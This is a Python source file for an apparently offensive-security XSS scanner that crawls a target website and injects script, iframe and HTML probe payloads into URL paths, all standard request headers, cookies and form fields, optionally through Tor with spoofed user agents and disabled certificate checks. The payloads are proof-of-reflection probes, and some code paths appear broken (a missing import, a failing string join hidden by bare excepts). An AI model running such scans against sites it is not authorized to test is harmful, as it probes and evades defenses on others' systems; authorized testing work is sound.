from TheSilent.clear import *
from TheSilent.form_scanner import *
from TheSilent.link_scanner import *
from TheSilent.return_user_agent import *

import requests
import time
import urllib.parse

cyan = "\033[1;36m"
red = "\033[1;31m"

#create html sessions object
web_session = requests.Session()

#fake headers
user_agent = {"User-Agent" : return_user_agent()}

tor_proxy = {"http": "socks5h://localhost:9050", "https": "socks5h://localhost:9050"}

#increased security
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

#increased security
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

except AttributeError:
    pass

def return_mal_payloads():
    #malicious script
    mal_payloads = []

    my_string = f"<div>The Silent</div>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<div>The Silent</div>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<div>The Silent</div>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)
    
    my_string = f"<DIV>THE SILENT</DIV>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<DIV>THE SILENT</DIV>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<DIV>THE SILENT</DIV>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"<iframe>The Silent</iframe>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<iframe>The Silent</iframe>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<iframe>The Silent</iframe>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"<IFRAME>THE SILENT</IFRAME>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<IFRAME>THE SILENT</IFRAME>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<IFRAME>THE SILENT</IFRAME>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)
    
    my_string = f"<input type='text' id='TheSilent' name='TheSilent' value='TheSilent'>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<input type='text' id='TheSilent' name='TheSilent' value='TheSilent'>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<input type='text' id='TheSilent' name='TheSilent' value='TheSilent'>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)
    
    my_string = f"<INPUT TYPE='TEXT' ID='THESILENT' NAME='THESILENT' VALUE='THESILENT'>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<INPUT TYPE='TEXT' ID='THESILENT' NAME='THESILENT' VALUE='THESILENT'>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<INPUT TYPE='TEXT' ID='THESILENT' NAME='THESILENT' VALUE='THESILENT'>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)
    
    my_string = f"<p>The Silent</p>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<p>The Silent</p>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<p>The Silent</p>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)
    
    my_string = f"<P>THE SILENT</P>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<P>THE SILENT</P>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<P>THE SILENT</P>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"<script>alert('The Silent')</script>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<script>alert('The Silent')</script>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<script>alert('The Silent')</script>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)
    
    my_string = f"<SCRIPT>alert('THE SILENT')</SCRIPT>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<SCRIPT>alert('THE SILENT')</SCRIPT>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<SCRIPT>alert('THE SILENT')</SCRIPT>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"<script>prompt('The Silent')</script>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<script>prompt('The Silent')</script>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<script>prompt('The Silent')</script>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)
    
    my_string = f"<SCRIPT>prompt('THE SILENT')</SCRIPT>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<SCRIPT>prompt('THE SILENT')</SCRIPT>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<SCRIPT>prompt('THE SILENT')</SCRIPT>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"<strong>The Silent</strong>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<strong>The Silent</strong>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<strong>The Silent</strong>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)
    
    my_string = f"<STRONG>THE SILENT</STRONG>"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"\\<STRONG>THE SILENT</STRONG>\\"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)

    my_string = f"&<STRONG>THE SILENT</STRONG>&"
    mal_payloads.append(urllib.parse.quote(str(my_string)))
    mal_payloads.append(my_string)


    return mal_payloads

#scans for xss
def xss_scanner(url, secure = True, tor = False, crawl = "0", my_file = " ", parse = " ", delay = 1):
    mal_scripts = ["<div>The Silent</div>", "<DIV>THE SILENT</DIV>", "<iframe>The Silent</iframe>", "<IFRAME>THE SILENT</IFRAME>", "<input type='text' id='TheSilent' name='TheSilent' value='TheSilent'>", "<INPUT TYPE='TEXT' ID='THESILENT' NAME='THESILENT' VALUE='THESILENT'>", "<p>The Silent</p>", "<P>THE SILENT</P>", "<script>alert('The Silent')</script>", "<SCRIPT>alert('THE SILENT')</SCRIPT>", "<script>prompt('The Silent')</script>", "<SCRIPT>prompt('THE SILENT')</SCRIPT>", "<strong>The Silent</strong>", "<STRONG>THE SILENT</STRONG>"]
    
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"
        
    my_list = []
    
    clear()

    #crawl
    my_result = []

    if my_file == " ":
        my_result = link_scanner(url = url, secure = secure, tor = tor, crawl = crawl, parse = parse, delay = delay)

    if my_file != " ":
        with open(my_file, "r", errors = "ignore") as file:
            for i in file:
                clean = i.replace("\n", "")
                my_result.append(clean)

    clear()

    for links in my_result:
        mal_payloads = return_mal_payloads()
        
        try:
            for mal_script in mal_payloads:
                if links.endswith("/"):
                    my_url = links + mal_script

                if not links.endswith("/"):
                    my_url = links + "/" + mal_script

                print(cyan + "checking: " + str(my_url)) 
                
                #prevent dos attacks
                time.sleep(delay)
                
                if tor == True:
                    result = web_session.get(my_url, verify = False, headers = user_agent, proxies = tor_proxy, timeout = (5, 30))
                    
                if tor == False:
                    result = web_session.get(my_url, verify = False, headers = user_agent, timeout = (5, 30))

                if result.status_code == 403:
                    print(red + "firewall detected")

                if result.status_code >= 200 and result.status_code < 300:
                    for scripts in mal_scripts:
                        if scripts in result.text:
                            print(cyan + "true: " + my_url)
                            my_list.append(my_url)
                            break

        except:
            continue
        
        client_headers = ["A-IM", "Accept", "Accept-Charset", "Accept-Datetime", "Accept-Encoding", "Accept-Language", "Access-Control-Request-Method", "Access-Control-Request-Headers", "Authorization", "Cache-Control", "Cookie", "Connection", "Content-Encoding", "Content-Length", "Content-MD5", "Content-Type", "Date", "Expect", "Forwarded", "From", "Host", "HTTP2-Settings", "If-Match", "If-Modified-Since", "If-None-Match", "If-Range", "If-Unmodified-Since", "Max-Forwards", "Origin", "Pragma", "Prefer", "Proxy-Authorization", "Range", "Referer", "TE", "Trailer", "Transfer-Encoding", "Upgrade", "Via", "Warning"]
        try:
            for mal_script in mal_payloads:
                for http_header in client_headers:
                    user_agent_moded = {"User-Agent":return_user_agent(), http_header:mal_script}
                    print(cyan + "checking: " + str(links) + " (headers) "  + str(user_agent_moded))

                    #prevent dos attacks
                    time.sleep(delay)

                    if tor == True:
                        result = web_session.get(links, verify = False, headers = user_agent_moded, proxies = tor_proxy, timeout = (5, 30))

                    if tor == False:
                        result = web_session.get(links, verify = False, headers = user_agent_moded, timeout = (5, 30))

                    if result.status_code == 403:
                        print(red + str(links) + " (headers) "  + str(user_agent_moded) + " firewall detected")

                    if result.status_code >= 200 and result.status_code < 300:
                        for scripts in mal_scripts:
                            if scripts in result.text:
                                print(cyan + "true: " + str(links) + " (headers) "  + str(user_agent_moded))
                                my_list.append(str(links) + " (headers) "  + str(user_agent_moded))
                                break

        except:
            continue
            
        try:
            for mal_script in mal_payloads:
                mal_cookie = {mal_script:mal_script}
                print(cyan + "checking: " + str(links) + " (cookies) " + mal_cookie)
                
                #prevent dos attacks
                time.sleep(delay)

                if tor == True:
                    result = web_session.get(links, verify = False, headers = user_agent, cookies = mal_cookie, proxies = tor_proxy, timeout = (5, 30))

                if tor == False:
                    result = web_session.get(links, verify = False, headers = user_agent, cookies = mal_cookie, timeout = (5, 30))
                
                if result.status_code == 403:
                    print(red + str(links) + " (cookies) " + mal_cookie + " firewall detected")

                if result.status_code >= 200 and result.status_code < 300:
                    for scripts in mal_scripts:
                        if scripts in result.text:
                            print(cyan + "true: " + links + " (cookie) " + scripts)
                            my_list.append(links + " (cookie) " + scripts)
                            break

        except:
            continue

        try:
            print(cyan + "checking for forms on: " + links)
            clean = links.replace("http://", "")
            clean = clean.replace("https://", "")
            
            form_input = form_scanner(clean, secure = secure, tor = tor, parse = "input")
            form_activities = form_scanner(clean, secure = secure, tor = tor)

            for activity in form_activities:
                for i in form_input:
                    for mal_script in mal_payloads:
                        name = re.findall("name=\"(\S+)\"", i)
                        mal_dict = {name[0] : mal_script}

                        if name[0] in activity:
                            action = re.findall("action=\"(\S+)\"", activity)
                            method = re.findall("method=\"(\S+)\"", activity)
                            
                            if action[0] != "":
                                if links.endswith("/") and action[0] != links + "/" or links.endswith("/") and action[0] != links:
                                    my_link = links + action[0]

                                elif action[0] == links + "/" or action[0] == links:
                                    my_link = links

                                else:
                                    my_link = links + "/" + action[0]

                            else:
                                my_link = links

                            
                            print(cyan + "checking: " + str(my_link) + " " + str(mal_dict))
                            
                            #prevent dos attacks
                            time.sleep(delay)

                            if tor == True:
                                if method[0].lower() == "get":
                                    get = web_session.get(my_link, params = mal_dict, verify = False, headers = user_agent, proxies = tor_proxy, timeout = (5, 30))
                                
                                if method[0].lower() == "post":
                                    post = web_session.post(my_link, data = mal_dict, verify = False, headers = user_agent, proxies = tor_proxy, timeout = (5, 30))

                            if tor == False:
                                if method[0].lower() == "get":
                                    get = web_session.get(my_link, params = mal_dict, verify = False, headers = user_agent, timeout = (5, 30))
                                
                                if method[0].lower() == "post":
                                    post = web_session.post(my_link, data = mal_dict, verify = False, headers = user_agent, timeout = (5, 30))

                            if method[0].lower() == "get":
                                if get.status_code == 403:
                                    print(red + "firewall detected")

                                if get.status_code >= 200 and get.status_code < 300:
                                    for scripts in mal_scripts:
                                        if scripts in get.text:
                                            print(cyan + "true: " + str(my_link) + " {" + str(name[0]) +  ":" + scripts + "}")
                                            my_list.append(str(my_link) + " {" + str(name[0]) +  ":" + scripts + "}")
                                            break

                            if method[0].lower() == "post":
                                if post.status_code == 403:
                                    print(red + "firewall detected")

                                if post.status_code >= 200 and post.status_code < 300:
                                    for scripts in mal_scripts:
                                        if scripts in post.text:
                                            print(cyan + "true: " + str(my_link) + " {" + str(name[0]) +  ":" + scripts + "}")
                                            my_list.append(str(my_link) + " {" + str(name[0]) +  ":" + scripts + "}")
                                            break

        except:
            continue
    
    print(cyan + "")
    clear()

    my_list = list(dict.fromkeys(my_list))
    my_list.sort()

    return my_list
